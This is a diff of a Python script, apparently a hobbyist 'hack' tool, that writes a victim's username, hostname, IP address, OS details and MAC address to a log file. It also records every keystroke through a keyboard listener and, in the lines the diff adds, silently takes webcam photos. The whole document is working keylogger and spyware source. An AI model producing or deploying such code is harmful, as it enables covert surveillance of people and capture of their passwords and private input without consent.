@@ -4,66 +4,77 @@ import getpass
 import socket
 import platform
 import uuid
+from getmac  import get_mac_address as gma
+from pynput import keyboard
+import cv2
+import time
+
 
 textname = 'meow_meow_hacklog.txt'
 
 
-#DATE AND TIME
+
 def dateandtime():
     dateandtimenow = datetime.now()
     with open(textname, 'w') as file:
+
         file.write('DATE AND TIME RAN: \n'+ str(dateandtimenow) + '\n')
         file.write('\n')
+
 dateandtime()
 
 
-#USER NAME
 def username():
     usernameofpc = getpass.getuser()
     with open(textname, 'a') as file:
+
         file.write('PC USERNAME: \n'+ str(usernameofpc) + '\n')
         file.write('\n')
 username()
 
-
-#DEVICE NAME
 def devname():
     devicename = socket.gethostname()
     with open(textname, 'a') as file:
+
         file.write('DEVICE NAME: \n'+ str(devicename) + '\n')
         file.write('\n') 
 devname()
 
-
-#IP ADDRESS
 def ipaddr():
     devicename = socket.gethostname()
     ipaddress = socket.gethostbyname(devicename)
     with open(textname, 'a') as file:
+
             file.write('IP: \n'+ str(ipaddress) + '\n')
             file.write('\n') 
+
+
 ipaddr()
 
 
-#OS NAME
 def osnameversion():
+
     osname = platform.uname()
     with open(textname, 'a') as file:
+
             file.write('OS NAME: \n'+ str(osname) + '\n')
             file.write('\n') 
+
+
 osnameversion()
 
-
-#CPU ARCHITECTURE
 def cpuarchi():
+
     cpu = platform.architecture()
     with open(textname, 'a') as file:
 
             file.write('CPU ARCHITECTURE: \n'+ str(cpu) + '\n')
             file.write('\n') 
+
+
 cpuarchi()
 
-#MAC ADDRESS
+
 def macaddr():
     mac_addr = gma()
     with open(textname, 'a') as file:
@@ -71,12 +82,31 @@ def macaddr():
             file.write('\n') 
 macaddr()
 
+
+def capture_image(start_num, end_num, base_name = 'py_pic', delay=5):
+    cam = cv2.VideoCapture(0)
+    for i in range(start_num, end_num + 1):
+        successful, frame = cam.read() 
+        pic_name = f" [ENTER FILE PATH HERE]: {base_name}{i}.png"
+        if successful:
+            cv2.imwrite(pic_name, frame)
+  
+        else:
+            print('Failed to capture image')
+        if i < end_num:
+             time.sleep(delay)
+    cam.release()
+    cv2.destroyAllWindows()
+
+capture_image(1, 3)
+
+
 def on_press(key):
     with open(textname, 'a') as file:
         try:
-            file.write(f"{key.char} ")
+            file.write(f"{key.char}")
         except AttributeError:
-            file.write(f"[{key.name}] ")
+            file.write(f" [{key.name}] ")
 
         file.flush()
 
@@ -88,3 +118,5 @@ def on_press(key):
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
+
